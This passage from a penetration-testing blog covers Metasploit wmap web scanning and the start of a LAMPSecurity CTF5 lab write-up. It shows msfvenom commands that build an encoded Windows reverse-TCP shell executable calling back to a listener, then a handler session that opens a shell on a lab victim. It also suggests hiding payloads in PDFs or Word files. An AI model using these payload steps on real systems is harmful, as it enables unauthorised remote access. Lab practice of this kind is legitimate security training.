<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_modules -h
</span><span class='line'>[*] Usage: wmap_modules [options]
</span><span class='line'>  -h      Display this help text
</span><span class='line'>  -l          List all wmap enabled modules
</span><span class='line'>  -r      Reload wmap modules
</span><span class='line'>
</span><span class='line'>msf &gt; wmap_modules -l
</span><span class='line'>[*] Loading wmap modules...
</span><span class='line'>[*] 40 wmap enabled modules loaded.
</span><span class='line'>[*] wmap_ssl
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>     Name                         OrderID
</span><span class='line'>     ----                         -------
</span><span class='line'>     auxiliary/scanner/http/cert  :last
</span><span class='line'>     auxiliary/scanner/http/ssl   :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_server
</span><span class='line'>===========
</span><span class='line'>
</span><span class='line'>     Name                                           OrderID
</span><span class='line'>     ----                                           -------
</span><span class='line'>     auxiliary/admin/http/tomcat_administration     :last
</span><span class='line'>     auxiliary/admin/http/tomcat_utf8_traversal     :last
</span><span class='line'>     auxiliary/scanner/http/drupal_views_user_enum  :last
</span><span class='line'>     auxiliary/scanner/http/frontpage_login         :last
</span><span class='line'>     auxiliary/scanner/http/host_header_injection   :last
</span><span class='line'>     auxiliary/scanner/http/http_version            0
</span><span class='line'>     auxiliary/scanner/http/open_proxy              1
</span><span class='line'>     auxiliary/scanner/http/options                 :last
</span><span class='line'>     auxiliary/scanner/http/robots_txt              :last
</span><span class='line'>     auxiliary/scanner/http/scraper                 :last
</span><span class='line'>     auxiliary/scanner/http/svn_scanner             :last
</span><span class='line'>     auxiliary/scanner/http/trace                   :last
</span><span class='line'>     auxiliary/scanner/http/vhost_scanner           :last
</span><span class='line'>     auxiliary/scanner/http/webdav_internal_ip      :last
</span><span class='line'>     auxiliary/scanner/http/webdav_scanner          :last
</span><span class='line'>     auxiliary/scanner/http/webdav_website_content  :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_dir
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>     Name                                                   OrderID
</span><span class='line'>     ----                                                   -------
</span><span class='line'>     auxiliary/scanner/http/brute_dirs                      :last
</span><span class='line'>     auxiliary/scanner/http/dir_listing                     :last
</span><span class='line'>     auxiliary/scanner/http/dir_scanner                     :last
</span><span class='line'>     auxiliary/scanner/http/dir_webdav_unicode_bypass       :last
</span><span class='line'>     auxiliary/scanner/http/file_same_name_dir              :last
</span><span class='line'>     auxiliary/scanner/http/files_dir                       :last
</span><span class='line'>     auxiliary/scanner/http/http_put                        :last
</span><span class='line'>     auxiliary/scanner/http/ms09_020_webdav_unicode_bypass  :last
</span><span class='line'>     auxiliary/scanner/http/prev_dir_same_name_file         :last
</span><span class='line'>     auxiliary/scanner/http/soap_xml                        :last
</span><span class='line'>     auxiliary/scanner/http/trace_axd                       :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_file
</span><span class='line'>=========
</span><span class='line'>
</span><span class='line'>     Name                                     OrderID
</span><span class='line'>     ----                                     -------
</span><span class='line'>     auxiliary/dos/http/apache_range_dos      :last
</span><span class='line'>     auxiliary/scanner/http/backup_file       :last
</span><span class='line'>     auxiliary/scanner/http/copy_of_file      :last
</span><span class='line'>     auxiliary/scanner/http/replace_ext       :last
</span><span class='line'>     auxiliary/scanner/http/verb_auth_bypass  :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_unique_query
</span><span class='line'>=================
</span><span class='line'>
</span><span class='line'>     Name                                          OrderID
</span><span class='line'>     ----                                          -------
</span><span class='line'>     auxiliary/scanner/http/blind_sql_query        :last
</span><span class='line'>     auxiliary/scanner/http/error_sql_injection    :last
</span><span class='line'>     auxiliary/scanner/http/http_traversal         :last
</span><span class='line'>     auxiliary/scanner/http/rails_mass_assignment  :last
</span><span class='line'>     exploit/multi/http/lcms_php_exec              :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_query
</span><span class='line'>==========
</span><span class='line'>
</span><span class='line'>     Name  OrderID
</span><span class='line'>     ----  -------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_generic
</span><span class='line'>============
</span><span class='line'>
</span><span class='line'>     Name  OrderID
</span><span class='line'>     ----  -------</span></code></pre></td></tr></table></div></figure>


<p>And finally, you can see which modules are enabled for your target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_run -h
</span><span class='line'>[*] Usage: wmap_run [options]
</span><span class='line'>  -h                        Display this help text
</span><span class='line'>  -t                        Show all enabled modules
</span><span class='line'>  -m [regex]                Launch only modules that name match provided regex.
</span><span class='line'>  -p [regex]                Only test path defined by regex.
</span><span class='line'>  -e [/path/to/profile]     Launch profile modules against all matched targets.
</span><span class='line'>                            (No profile file runs all enabled modules.)
</span><span class='line'>msf &gt; wmap_run -t
</span><span class='line'>[*] Testing target:
</span><span class='line'>[*]   Site: 192.168.80.157 (192.168.80.157)
</span><span class='line'>[*]   Port: 80 SSL: false
</span><span class='line'>============================================================
</span><span class='line'>[*] Testing started. 2016-06-07 13:37:11 -0400
</span><span class='line'>[*] 
</span><span class='line'>=[ SSL testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Target is not SSL. SSL modules disabled.
</span><span class='line'>[*] 
</span><span class='line'>=[ Web Server testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Module auxiliary/scanner/http/http_version
</span><span class='line'>[*] Module auxiliary/scanner/http/open_proxy
</span><span class='line'>[*] Module auxiliary/scanner/http/robots_txt
</span><span class='line'>[*] Module auxiliary/scanner/http/frontpage_login
</span><span class='line'>[*] Module auxiliary/scanner/http/host_header_injection
</span><span class='line'>[*] Module auxiliary/admin/http/tomcat_administration
</span><span class='line'>[*] Module auxiliary/admin/http/tomcat_utf8_traversal
</span><span class='line'>[*] Module auxiliary/scanner/http/options
</span><span class='line'>[*] Module auxiliary/scanner/http/drupal_views_user_enum
</span><span class='line'>[*] Module auxiliary/scanner/http/scraper
</span><span class='line'>[*] Module auxiliary/scanner/http/svn_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/trace
</span><span class='line'>[*] Module auxiliary/scanner/http/vhost_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/webdav_internal_ip
</span><span class='line'>[*] Module auxiliary/scanner/http/webdav_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/webdav_website_content
</span><span class='line'>[*] 
</span><span class='line'>=[ File/Dir testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Module auxiliary/dos/http/apache_range_dos
</span><span class='line'>[*] Module auxiliary/scanner/http/backup_file
</span><span class='line'>[*] Module auxiliary/scanner/http/brute_dirs
</span><span class='line'>[*] Module auxiliary/scanner/http/copy_of_file
</span><span class='line'>[*] Module auxiliary/scanner/http/dir_listing
</span><span class='line'>[*] Module auxiliary/scanner/http/dir_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
</span><span class='line'>[*] Module auxiliary/scanner/http/file_same_name_dir
</span><span class='line'>[*] Module auxiliary/scanner/http/files_dir
</span><span class='line'>[*] Module auxiliary/scanner/http/http_put
</span><span class='line'>[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
</span><span class='line'>[*] Module auxiliary/scanner/http/prev_dir_same_name_file
</span><span class='line'>[*] Module auxiliary/scanner/http/replace_ext
</span><span class='line'>[*] Module auxiliary/scanner/http/soap_xml
</span><span class='line'>[*] Module auxiliary/scanner/http/trace_axd
</span><span class='line'>[*] Module auxiliary/scanner/http/verb_auth_bypass
</span><span class='line'>[*] 
</span><span class='line'>=[ Unique Query testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Module auxiliary/scanner/http/blind_sql_query
</span><span class='line'>[*] Module auxiliary/scanner/http/error_sql_injection
</span><span class='line'>[*] Module auxiliary/scanner/http/http_traversal
</span><span class='line'>[*] Module auxiliary/scanner/http/rails_mass_assignment
</span><span class='line'>[*] Module exploit/multi/http/lcms_php_exec
</span><span class='line'>[*] 
</span><span class='line'>=[ Query testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] 
</span><span class='line'>=[ General testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Done.</span></code></pre></td></tr></table></div></figure>


<p>I started the scan with <code>wmap_run -e</code> (not showing the output due to size). After it finished, I checked if any interesting vulnerabilities were uncovered:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_vulns -l
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): scraper /
</span><span class='line'>[*]   scraper Scraper
</span><span class='line'>[*]   GET CTF 6 - Widgets Inc.
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /docs/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 200
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /js/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 200
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /lib/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 200
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /logs/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 401
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Only a bunch of directories discovered but you don&rsquo;t know what you can find without looking.</p>

<h1>Generating executables</h1>

<p>With Msfvenom, you can not only generate shellcode, but also create executables from whichever payload you want to use.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#msfvenom -h
</span><span class='line'>Options:
</span><span class='line'>    -p, --payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads
</span><span class='line'>        --payload-options            List the payload's standard options
</span><span class='line'>    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
</span><span class='line'>    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload
</span><span class='line'>    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list)
</span><span class='line'>        --help-formats               List available formats
</span><span class='line'>    -e, --encoder       &lt;encoder&gt;    The encoder to use
</span><span class='line'>    -a, --arch          &lt;arch&gt;       The architecture to use
</span><span class='line'>        --platform      &lt;platform&gt;   The platform of the payload
</span><span class='line'>        --help-platforms             List available platforms
</span><span class='line'>    -s, --space         &lt;length&gt;     The maximum size of the resulting payload
</span><span class='line'>        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)
</span><span class='line'>    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff'
</span><span class='line'>    -i, --iterations    &lt;count&gt;      The number of times to encode the payload
</span><span class='line'>    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include
</span><span class='line'>    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template
</span><span class='line'>    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
</span><span class='line'>    -o, --out           &lt;path&gt;       Save the payload
</span><span class='line'>    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats
</span><span class='line'>        --smallest                   Generate the smallest possible payload
</span><span class='line'>    -h, --help                       Show this message</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s say we want to use a reverse shell executable. First, let&rsquo;s look at the payload options:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#msfvenom --payload-options -p windows/x64/shell/reverse_tcp
</span><span class='line'>Ignoring bcrypt-3.1.10 because its extensions are not built.  Try: gem pristine bcrypt --version 3.1.10
</span><span class='line'>Options for payload/windows/x64/shell/reverse_tcp:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       Name: Windows x64 Command Shell, Windows x64 Reverse TCP Stager
</span><span class='line'>     Module: payload/windows/x64/shell/reverse_tcp
</span><span class='line'>   Platform: Windows
</span><span class='line'>       Arch: x86_64
</span><span class='line'>Needs Admin: No
</span><span class='line'> Total size: 449
</span><span class='line'>       Rank: Normal
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>    sf &lt;stephen_fewer@harmonysecurity.com&gt;
</span><span class='line'>
</span><span class='line'>Basic options:
</span><span class='line'>Name      Current Setting  Required  Description
</span><span class='line'>----      ---------------  --------  -----------
</span><span class='line'>EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>LPORT     4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  Spawn a piped command shell (Windows x64) (staged). Connect back to 
</span><span class='line'>  the attacker (Windows x64)
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Now we know what options we need for creating an executable. I already have the LHOST and LPORT set, but will pass them anyway for demo purposes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.80.155 LPORT=4444 -b "\x00" -e x64/xor -f exe -o ~/doom.exe
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86_64 from the payload
</span><span class='line'>Found 1 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x64/xor
</span><span class='line'>x64/xor succeeded with size 551 (iteration=0)
</span><span class='line'>x64/xor chosen with final size 551
</span><span class='line'>Payload size: 551 bytes
</span><span class='line'>Saved as: /root/doom.exe</span></code></pre></td></tr></table></div></figure>


<p>Inside Metasploit, we have to launch the generic payload handler. <a href="https://www.rapid7.com/db/modules/exploit/multi/handler">This module is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.</a>. Don&rsquo;t forget to set the options and the payload to match the one you put in the executable:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/handler
</span><span class='line'>msf exploit(handler) &gt; set payload windows/x64/shell/reverse_tcp
</span><span class='line'>payload =&gt; windows/x64/shell/reverse_tcp
</span><span class='line'>msf exploit(handler) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/handler):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/x64/shell/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Wildcard Target</span></code></pre></td></tr></table></div></figure>


<p>Now run the exploit on your machine. All you need to do now is to transfer your executable to the victim machine and run it there to receive your shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; run 
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:4444 
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] Sending stage (336 bytes) to 192.168.80.128
</span><span class='line'>[*] Command shell session 1 opened (192.168.80.155:4444 -&gt; 192.168.80.128:49196) at 2016-06-08 11:19:16 -0400
</span><span class='line'>
</span><span class='line'>Microsoft Windows [Version 6.1.7601]
</span><span class='line'>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
</span><span class='line'>
</span><span class='line'>C:\Users\wingoat\Desktop&gt;</span></code></pre></td></tr></table></div></figure>


<p>Success! This demo was pretty straightforward, but if executables attract too much attention on the target, you can try to sneak your payload into PDFs or Word documents instead.</p>

<h5>Conclusion</h5>

<p>This was a long post, but I wanted to showcase many of Metasploit&rsquo;s capabilities. It was a fun lab, but I barely scratched the surface of what&rsquo;s possible.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Don't hate yourself in the morning -- \
</span><span class='line'>\ sleep till noon.                      /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF5]]></title>
    <link href="http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/"/>
    <updated>2016-05-05T12:24:38-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5</id>
    <content type="html"><![CDATA[<p>Continuing the LAMPSecurity series, the next machine I&rsquo;m going after is CTF5.</p>

<!-- more -->


<h3>Recon</h3>

<p>Nmap scan reveals there are plenty of open ports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sS -sV -p1-65535 192.168.80.154
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-05-09 12:17 EDT
</span><span class='line'>Nmap scan report for 192.168.80.154
</span><span class='line'>Host is up, received arp-response (0.00024s latency).
</span><span class='line'>Not shown: 65524 closed ports
</span><span class='line'>Reason: 65524 resets
</span><span class='line'>PORT      STATE SERVICE     REASON         VERSION
</span><span class='line'>22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7 (protocol 2.0)
</span><span class='line'>25/tcp    open  smtp        syn-ack ttl 64 Sendmail 8.14.1/8.14.1
</span><span class='line'>80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.2.6 ((Fedora))
</span><span class='line'>110/tcp   open  pop3        syn-ack ttl 64 ipop3d 2006k.101
</span><span class='line'>111/tcp   open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
</span><span class='line'>139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
</span><span class='line'>143/tcp   open  imap        syn-ack ttl 64 University of Washington IMAP imapd 2006k.396 (time zone: -0400)
</span><span class='line'>445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
</span><span class='line'>901/tcp   open  http        syn-ack ttl 64 Samba SWAT administration server
</span><span class='line'>3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.0.45
</span><span class='line'>38972/tcp open  status      syn-ack ttl 64 1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>


<p>I searched for exploits for the versions of the listed services, but I couldn&rsquo;t find anything usable. So it&rsquo;s back to the web server..</p>

<h4>Web server</h4>

<p>The website provides some potential entry points that we&rsquo;ll have to take a closer look at:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/phake.png" title="phake home" alt="phake org"></p>

<p>We can register for a mailing list:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/list.png" title="mail list" alt="mailing list"></p>

<p>Tampering with the about page URL <code><a href="http://192.168.80.154/?page=about">http://192.168.80.154/?page=about</a></code> gives errors, so LFI might be possible</p>

<p>The blog page also has an admin login page and another Squirrel Mail page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/blog.png" title="blog" alt="blog"></p>

<p>The contact form allows you to send a message to the staff, and there is another app that acts as an event manager:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/event.png" title="event manager" alt="event planner"></p>

<p>Also, on port 901 there is a Samba SWAT server protected by basic authentication. This server provides a web-based interface for configuring Samba.</p>

<h3>Exploiting the CMS</h3>

<p>I made an account on the event manager, but that doesn&rsquo;t seem to help me much besides creating new blog posts. Next I tested to see if there might be any SQLi in the contact form, but no luck there either. And despite the path traversal error, I wasn&rsquo;t able to navigate to any arbitrary files on the system.</p>

<p>It turns out I had actually overlooked an important information. On Andy Carp&rsquo;s blog, we can see the site is powered by NanoCMS. I noticed it but I didn&rsquo;t give it any thought. When I finally thought to click on it and learn more, it took me to a domain-for-sale page, so I figured it might be some simulated CMS created for this challenge only. Good that I thought to google it and see how wrong I was :p <a href="https://github.com/kalyan02/NanoCMS">NanoCMS</a> is a lightweight CMS based on PHP that is now discontinued. However, I found a super useful <a href="http://www.madirish.net/304">NanoCMS security review</a> that made possible the compromising of the target ;)</p>

